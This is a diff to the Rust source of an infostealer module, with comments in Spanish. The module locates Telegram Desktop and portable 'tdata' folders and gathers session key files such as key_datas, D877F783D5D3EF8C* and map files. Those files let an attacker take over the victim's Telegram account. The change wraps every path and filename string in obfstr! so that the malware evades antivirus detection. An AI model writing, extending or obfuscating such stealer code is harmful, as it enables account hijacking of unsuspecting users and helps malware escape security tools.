@@ -2,6 +2,7 @@
 use crate::stealer::common::get_appdata_roaming;
 use std::path::PathBuf;
 use std::fs;
+use obfstr::obfstr; // ← Ofuscación de strings
 
 /// Datos de sesión de Telegram robados
 #[derive(Debug, Clone)]
@@ -43,7 +44,7 @@ fn steal_telegram_desktop() -> Vec<TelegramSession> {
     };
     
     // Telegram Desktop guarda datos en %APPDATA%\Telegram Desktop\tdata
-    let telegram_path = roaming_appdata.join("Telegram Desktop").join("tdata");
+    let telegram_path = roaming_appdata.join(obfstr!("Telegram Desktop")).join(obfstr!("tdata"));
     
     if !telegram_path.exists() {
         return sessions;
@@ -78,13 +79,13 @@ fn steal_telegram_desktop() -> Vec<TelegramSession> {
                 continue;
             }
             
-            // Archivos importantes:
+            // Archivos importantes (OFUSCADOS):
             let is_important = 
-                file_name == "key_datas" ||              // ¡MUY IMPORTANTE! Clave de sesión
-                file_name == "key_data" ||
-                file_name.starts_with("D877F783D5D3EF8C") ||  // Archivos de sesión
-                file_name.starts_with("map") ||          // Mapeo
-                file_name.starts_with("settings") ||     // Configuraciones
+                file_name == obfstr!("key_datas") ||              // ¡MUY IMPORTANTE! Clave de sesión
+                file_name == obfstr!("key_data") ||
+                file_name.starts_with(obfstr!("D877F783D5D3EF8C")) ||  // Archivos de sesión
+                file_name.starts_with(obfstr!("map")) ||          // Mapeo
+                file_name.starts_with(obfstr!("settings")) ||     // Configuraciones
                 file_name.ends_with("s") && file_name.len() == 17;  // Archivos de sesión hexadecimal
             
             if is_important {
@@ -95,7 +96,7 @@ fn steal_telegram_desktop() -> Vec<TelegramSession> {
     
     if !session_files.is_empty() {
         sessions.push(TelegramSession {
-            app_type: "Telegram Desktop".to_string(),
+            app_type: obfstr!("Telegram Desktop").to_string(),
             path: telegram_path,
             files: session_files,
         });
@@ -129,7 +130,7 @@ fn steal_telegram_portable() -> Vec<TelegramSession> {
             continue;
         }
         
-        // Buscar carpetas "Telegram" o "TelegramPortable"
+        // Buscar carpetas ofuscadas
         if let Ok(entries) = fs::read_dir(&base_path) {
             for entry in entries.flatten() {
                 let path = entry.path();
@@ -140,12 +141,12 @@ fn steal_telegram_portable() -> Vec<TelegramSession> {
                 
                 let dir_name = entry.file_name().to_string_lossy().to_lowercase();
                 
-                if dir_name.contains("telegram") {
+                if dir_name.contains(obfstr!("telegram")) {
                     // Buscar subcarpeta tdata
-                    let tdata_path = path.join("tdata");
+                    let tdata_path = path.join(obfstr!("tdata"));
                     
                     if tdata_path.exists() {
-                        if let Some(session) = extract_telegram_session(&tdata_path, "Telegram Portable") {
+                        if let Some(session) = extract_telegram_session(&tdata_path, obfstr!("Telegram Portable")) {
                             sessions.push(session);
                         }
                     }
@@ -180,13 +181,13 @@ fn extract_telegram_session(tdata_path: &PathBuf, app_type: &str) -> Option<Tele
                 continue;
             }
             
-            // Archivos importantes
+            // Archivos importantes (OFUSCADOS)
             let is_important = 
-                file_name == "key_datas" ||
-                file_name == "key_data" ||
-                file_name.starts_with("D877F783D5D3EF8C") ||
-                file_name.starts_with("map") ||
-                file_name.starts_with("settings") ||
+                file_name == obfstr!("key_datas") ||
+                file_name == obfstr!("key_data") ||
+                file_name.starts_with(obfstr!("D877F783D5D3EF8C")) ||
+                file_name.starts_with(obfstr!("map")) ||
+                file_name.starts_with(obfstr!("settings")) ||
                 (file_name.ends_with("s") && file_name.len() == 17);
             
             if is_important {
